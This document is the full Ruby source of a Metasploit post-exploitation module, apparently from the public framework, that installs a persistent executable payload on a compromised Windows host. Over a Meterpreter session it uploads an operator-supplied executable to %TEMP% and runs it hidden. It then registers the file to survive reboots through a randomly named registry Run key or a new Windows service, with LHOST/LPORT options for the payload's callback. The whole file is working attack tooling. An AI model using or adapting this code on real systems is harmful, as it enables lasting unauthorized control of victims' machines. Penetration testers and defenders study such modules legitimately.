###
## This module requires Metasploit: http://metasploit.com/download
## Current source: https://github.com/rapid7/metasploit-framework
###

require 'msf/core'
require 'rex'
require 'msf/core/post/common'
require 'msf/core/post/file'
require 'msf/core/post/windows/priv'
require 'msf/core/post/windows/registry'
require 'msf/core/post/windows/services'

class MetasploitModule < Msf::Post

	include Msf::Post::Common
	include Msf::Post::File
	include Msf::Post::Windows::Priv
	include Msf::Post::Windows::Registry
	include Msf::Post::Windows::WindowsServices

	def initialize(info={})
		super( update_info( info,
				'Name'          => 'Windows Manage Persistent EXE Payload Installer',
				'Description'   => %q{
				        This Module will upload a executable to a remote host and make it Persistent.
                                        It can be installed as USER, SYSTEM, or SERVICE.
				},
				'License'       => MSF_LICENSE,
				'Author'        => ['Merlyn drforbin Cousins <drforbin6[at]gmail.com>'],
				'Version'       => '$Revision:1$',
				'Platform'      => [ 'windows' ],
				'SessionTypes'  => [ 'meterpreter']
			))

		register_options(
			[
				OptAddress.new('LHOST', [true, 'IP for persistent payload to connect to.']),
				OptInt.new('LPORT', [true, 'Port for persistent payload to connect to.']),
				OptEnum.new('STARTUP', [true, 'Startup type for the persistent payload.', 'USER', ['USER','SYSTEM','SERVICE']]),
				OptString.new('REXE',[false, 'The remote executable to use.','my/default/path']),
				OptString.new('REXENAME',[false, 'The name to call exe on remote system','default.exe'])
			], self.class)

	end

	# Run Method for when run command is issued
	#-------------------------------------------------------------------------------
	def run
		print_status("Running module against #{sysinfo['Computer']}")

		# Set vars
		rexe = datastore['REXE']
		rexename = datastore['REXENAME']
		lhost = datastore['LHOST']
		lport = datastore['LPORT']
		@clean_up_rc = ""
		

			if datastore['REXE'] == nil
				print_error ("REXE is null...please define")
				return
			end
			
			if not ::File.exist?(datastore['REXE'])
				print_error (" Rexe file does not exist!")
				return
			end
			
			raw = create_payload_from_file (rexe)			
			

		# Write script to %TEMP% on target
		script_on_target = write_exe_to_target(raw,rexename) 
 

		# Initial execution of script
		target_exec(script_on_target)

		case datastore['STARTUP']
		when /USER/i
			write_to_reg("HKCU",script_on_target)
		when /SYSTEM/i
			write_to_reg("HKLM",script_on_target)
		when /SERVICE/i
			install_as_service(script_on_target)
		end

		clean_rc = log_file()
		file_local_write(clean_rc,@clean_up_rc)
		print_status("Cleanup Meterpreter RC File: #{clean_rc}")

		report_note(:host => host,
			:type => "host.persistance.cleanup",
			:data => {
				:local_id => session.sid,
				:stype => session.type,
				:desc => session.info,
				:platform => session.platform,
				:via_payload => session.via_payload,
				:via_exploit => session.via_exploit,
				:created_at => Time.now.utc,
				:commands =>  @clean_up_rc
			}
		)
	end


	# Function for creating log folder and returning log path
	#-------------------------------------------------------------------------------
	def log_file(log_path = nil)
		#Get hostname
		host = session.sys.config.sysinfo["Computer"]

		# Create Filename info to be appended to downloaded files
		filenameinfo = "_" + ::Time.now.strftime("%Y%m%d.%M%S")

		# Create a directory for the logs
		if log_path
			logs = ::File.join(log_path, 'logs', 'persistence', Rex::FileUtils.clean_path(host + filenameinfo) )
		else
			logs = ::File.join(Msf::Config.log_directory, 'persistence', Rex::FileUtils.clean_path(host + filenameinfo) )
		end

		# Create the log directory
		::FileUtils.mkdir_p(logs)

		#logfile name
		logfile = logs + ::File::Separator + Rex::FileUtils.clean_path(host + filenameinfo) + ".rc"
		return logfile
	end

	# Function to execute script on target and return the PID of the process
	#-------------------------------------------------------------------------------
	def target_exec(script_on_target)
		print_status("Executing script #{script_on_target}")
		proc = session.sys.process.execute(script_on_target, nil, {'Hidden' => true})
		print_good("Agent executed with PID #{proc.pid}")
		@clean_up_rc << "kill #{proc.pid}\n"
		return proc.pid
	end

	# Function to install payload in to the registry HKLM or HKCU
	#-------------------------------------------------------------------------------
	def write_to_reg(key,script_on_target)
		nam = Rex::Text.rand_text_alpha(rand(8)+8)
		print_status("Installing into autorun as #{key}\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\#{nam}")
		if(key)
			registry_setvaldata("#{key}\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",nam,script_on_target,"REG_SZ")
			print_good("Installed into autorun as #{key}\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\#{nam}")
		else
			print_error("Error: failed to open the registry key for writing")
		end
	end

        # Function to install payload as a service
	#-------------------------------------------------------------------------------
	def install_as_service(script_on_target)
		if  is_system? or is_admin?  
			print_status("Installing as service..")
			nam = Rex::Text.rand_text_alpha(rand(8)+8)
			print_status("Creating service #{nam}")
			service_create(nam, nam, "cmd /c \"#{script_on_target}\"") 

			@clean_up_rc << "execute -H -f sc -a \"delete #{nam}\"\n"
		else
			print_error("Insufficient privileges to create service")
		end
	end


	# Function for writing executable to target host
	#-------------------------------------------------------------------------------
	def write_exe_to_target(vbs,rexename)
		tempdir = session.fs.file.expand_path("%TEMP%")
		tempvbs = tempdir + "\\" + rexename
		fd = session.fs.file.new(tempvbs, "wb")
		fd.write(vbs)
		fd.close
		print_good("Persistent Script written to #{tempvbs}")
		@clean_up_rc << "rm #{tempvbs}\n"
		return tempvbs
	end


        def create_payload_from_file(exec)
                print_status("Reading Payload from file #{exec}")
                return ::IO.read(exec)
        end

end
